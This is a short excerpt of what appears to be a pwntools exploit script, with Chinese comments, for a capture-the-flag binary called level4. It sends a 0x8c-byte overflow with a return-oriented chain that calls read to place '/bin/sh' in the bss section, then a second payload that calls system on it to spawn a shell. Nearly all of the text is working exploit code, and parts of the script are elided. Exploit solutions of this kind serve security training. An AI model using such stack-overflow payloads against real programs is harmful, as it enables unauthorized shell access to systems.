...
#a= process('./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0')
...
payload2='a'*0x8c+p32(read_addr)+p32(vul_addr)+p32(0)+p32(bss_addr)+p32(8)#bass段写入/bin/sh\x00
a.sendline(payload2)
a.send('/bin/sh\x00')
payload3='a'*0x8c+p32(system_addr)+p32(0xdeadbeef)+p32(bss_addr) #system bss段 /bin/sh\x00 getshell
a.sendline(payload3)
